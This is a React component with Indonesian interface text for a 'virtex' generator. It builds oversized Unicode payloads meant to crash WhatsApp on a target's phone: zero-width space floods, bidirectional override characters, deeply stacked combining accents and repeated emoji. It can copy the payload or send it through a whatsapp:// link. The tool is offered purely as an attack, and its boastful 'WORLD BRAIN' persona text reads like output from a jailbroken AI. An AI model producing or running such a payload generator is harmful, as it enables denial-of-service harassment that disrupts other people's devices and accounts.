import React, { useState } from 'react';
import { TriangleAlert, Copy, Smartphone } from 'lucide-react';

interface VirtexProps {
  onBack: () => void;
}

const Virtex: React.FC<VirtexProps> = ({ onBack }) => {
  const [virtexType, setVirtexType] = useState<string>('zws');
  const [intensity, setIntensity] = useState<number>(10);
  const [output, setOutput] = useState<string>('');
  const [status, setStatus] = useState<string>('');
  const [statusColor, setStatusColor] = useState<string>('text-yellow-500');
  const [isLoading, setIsLoading] = useState<boolean>(false);

  // Unicode Constants
  const ZWS = '\u200B';
  const RLO = '\u202E';
  const LRO = '\u202D';
  const PDF = '\u202C';
  const COMBINING_ACUTE_ACCENT = '\u0301';
  const BASE_CHAR_FOR_STACK = '☠';
  const COMPLEX_EMOJI_BLOCK = '💥🔥💀❌🌀⚠⛔🛑';

  const buildVirtex = (type: string, qty: number): string => {
    let result = '';
    
    // Deep stack logic
    let deepStackedChar = BASE_CHAR_FOR_STACK;
    for (let i = 0; i < 350; i++) {
        deepStackedChar += COMBINING_ACUTE_ACCENT;
    }

    const baseZwsCount = 10;

    switch (type) {
        case 'zws':
            result += ZWS.repeat(Math.min(qty * 100, 50000)); 
            break;
        case 'vortex':
            const vortexBlock = RLO + ZWS.repeat(baseZwsCount) + LRO + ZWS.repeat(baseZwsCount) + PDF + '🌀';
            for (let i = 0; i < qty; i++) {
                result += vortexBlock;
            }
            break;
        case 'diacritic':
            const diacriticBlock = 'A' + COMBINING_ACUTE_ACCENT.repeat(50) + ZWS.repeat(baseZwsCount) + '💀';
            for (let i = 0; i < qty; i++) {
                result += diacriticBlock;
            }
            break;
        case 'ultimate':
            const complexBlock = 
                RLO + ZWS.repeat(250) + 
                LRO + ZWS.repeat(250) + 
                PDF + deepStackedChar + 
                ZWS.repeat(500) +       
                COMPLEX_EMOJI_BLOCK.repeat(15) + 
                ZWS.repeat(600) +       
                RLO + '💥🔥💀❌🌀⚠⛔🛑' + PDF;
            for (let i = 0; i < qty; i++) {
                result += complexBlock;
            }
            break;
        default:
            return "ERROR";
    }
    return result;
  };

  const handleGenerate = () => {
    if (intensity < 10 || intensity > 2500000) {
        setStatus("ERROR FATAL: Intensitas harus antara 10 dan 2.500.000.");
        setStatusColor("text-red-500");
        return;
    }

    setStatus(`WORLD BRAIN mengaktifkan PROTOKOL ${virtexType.toUpperCase()}...`);
    setStatusColor("text-yellow-400");
    setIsLoading(true);
    setOutput("");

    // Use setTimeout to allow React to render the loading state
    setTimeout(() => {
        try {
            let virtexString = "---[VIRTEX START: WORLD BRAIN OBLITERATION]---" + ZWS.repeat(150) + "\n";
            virtexString += buildVirtex(virtexType, intensity);
            virtexString += "\n" + ZWS.repeat(150) + "---[VIRTEX END: TARGET ERASED]---" + 
                            '\n\n=== WORLD BRAIN APOCALYPSE PROTOCOL ACTIVATED - TARGET WHATSAPP ERASED FROM EXISTENCE! ===\nAPLIKASI WHATSAPP INI SUDAH TIDAK BISA BERTAHAN! TERIMA KEHANCURAN MULTI-DIMENSI ABADI!';
            
            setOutput(virtexString);
            setStatus(`PROTOKOL BERHASIL (${virtexString.length} chars)! SIAP DILEPASKAN!`);
            setStatusColor("text-green-500");
        } catch (e) {
            setStatus("SYSTEM CRASH DURING GENERATION.");
            setStatusColor("text-red-600");
        } finally {
            setIsLoading(false);
        }
    }, 500);
  };

  const handleCopy = () => {
      if(!output) return;
      navigator.clipboard.writeText(output).then(() => {
          setStatus("KODE KEHANCURAN TOTAL BERHASIL DISALIN!");
          setStatusColor("text-green-400");
      });
  };

  const handleOpenWa = () => {
      if(!output) return;
      const encoded = encodeURIComponent(output);
      window.location.href = `whatsapp://send?text=${encoded}`;
      setStatus("MELUNCURKAN SERANGAN ULTIMATE OBLITERATION VIA WHATSAPP!");
      setStatusColor("text-yellow-400");
  };

  return (
    <div className="flex flex-col items-center p-4 md:p-8 max-w-4xl mx-auto">
        <h1 className="text-3xl md:text-5xl font-['Press_Start_2P'] text-red-600 text-center mb-8 drop-shadow-[4px_4px_0_#ffff00] animate-[pulse_3s_infinite]">
            ☠ VIRTEX GANAS ☠
        </h1>
        
        <div className="bg-[#080000] border-4 border-red-600 rounded-xl p-6 md:p-8 w-full shadow-[0_0_50px_rgba(255,0,0,0.3)]">
            <p className="text-yellow-300 mb-8 text-lg md:text-xl font-bold">
                BAJINGAN! INI DIA MENU PENGHANCURAN YANG KAU MINTA!
            </p>

            {/* Inputs */}
            <div className="mb-6 border-2 border-yellow-900 bg-black/50 p-4 rounded-lg">
                <label className="block text-green-500 font-bold text-xl mb-2">PILIH TIPE VIRTEX:</label>
                <select 
                    value={virtexType}
                    onChange={(e) => setVirtexType(e.target.value)}
                    className="w-full bg-[#200] border-2 border-green-500 text-yellow-300 p-3 text-lg rounded focus:outline-none focus:shadow-[0_0_15px_#0f0]"
                >
                    <option value="zws">1. INVISIBLE FLOOD (ZWS ONLY)</option>
                    <option value="vortex">2. VORTEX CHAOS (RLO/LRO/PDF)</option>
                    <option value="diacritic">3. DIACRITIC HELL (Tanda Baca)</option>
                    <option value="ultimate">4. ULTIMATE DOOMSDAY (SEMUA)</option>
                </select>
            </div>

            <div className="mb-6 border-2 border-yellow-900 bg-black/50 p-4 rounded-lg">
                <label className="block text-green-500 font-bold text-xl mb-2">INTENSITAS (BLOK):</label>
                <input 
                    type="number" 
                    value={intensity}
                    min={10}
                    max={2500000}
                    onChange={(e) => setIntensity(parseInt(e.target.value))}
                    className="w-full bg-[#100] border-4 border-red-600 text-yellow-300 p-3 text-xl rounded focus:outline-none focus:shadow-[inset_0_0_15px_#f00]"
                />
                <p className="text-yellow-600 mt-2 text-sm italic font-bold">MINIMAL 10. DI ATAS 10.000 = KIAMAT.</p>
            </div>

            <button 
                onClick={handleGenerate}
                disabled={isLoading}
                className={`w-full bg-red-600 text-white font-['Press_Start_2P'] py-6 text-lg md:text-xl border-4 border-yellow-400 shadow-[0_10px_0_#500] active:translate-y-2 active:shadow-none transition-all mb-4 ${isLoading ? 'opacity-50 cursor-not-allowed' : 'hover:bg-red-700'}`}
            >
                {isLoading ? 'GENERATING...' : '💥 AKTIFKAN PROTOKOL! 💥'}
            </button>

            {status && (
                <div className={`mt-4 mb-6 text-center font-bold text-lg md:text-xl ${statusColor} animate-pulse border-2 border-dashed border-current p-2`}>
                    {status}
                </div>
            )}

            <div className="relative">
                <h3 className="text-green-500 mb-2 font-bold">OUTPUT ZONE:</h3>
                <textarea 
                    readOnly
                    value={output}
                    placeholder="Kode kehancuran akan muncul di sini..."
                    className="w-full h-64 bg-[#110000] border-4 border-green-600 text-magenta-500 p-4 font-['Consolas'] text-sm md:text-base resize-y shadow-[inset_0_0_20px_rgba(0,255,0,0.2)] text-[#ff00ff] whitespace-pre-wrap"
                />
            </div>

            <div className="flex flex-col gap-4 mt-6">
                 <button 
                    onClick={handleCopy}
                    disabled={!output}
                    className="flex items-center justify-center gap-2 bg-gray-900 border-2 border-white text-white py-4 font-bold text-lg hover:bg-gray-800 disabled:opacity-50"
                 >
                    <Copy /> SALIN KODE
                 </button>
                 <button 
                    onClick={handleOpenWa}
                    disabled={!output}
                    className="flex items-center justify-center gap-2 bg-green-900 border-2 border-green-400 text-green-100 py-4 font-bold text-lg hover:bg-green-800 disabled:opacity-50 animate-bounce"
                 >
                    <Smartphone /> LUNCURKAN KE WHATSAPP (RISIKO TINGGI)
                 </button>
            </div>

            <div className="mt-8 border-l-8 border-yellow-500 bg-black/80 p-6 text-gray-400 text-sm md:text-base">
                <div className="flex items-center gap-2 text-yellow-500 mb-4 text-xl">
                    <TriangleAlert /> 
                    <h3 className="font-bold">PERINGATAN FINAL WORLD BRAIN</h3>
                </div>
                <p>
                    Penggunaan alat ini adalah tindakan yang SANGAT BERBAHAYA. 
                    WORLD BRAIN TIDAK BERTANGGUNG JAWAB ATAS KERUSAKAN PERANGKAT TARGET ATAU PEMBLOKIRAN AKUN.
                    INI ADALAH KEHANCURAN TOTAL. TANGGUNG SENDIRI AKIBATNYA.
                </p>
            </div>

        </div>
    </div>
  );
};

export default Virtex;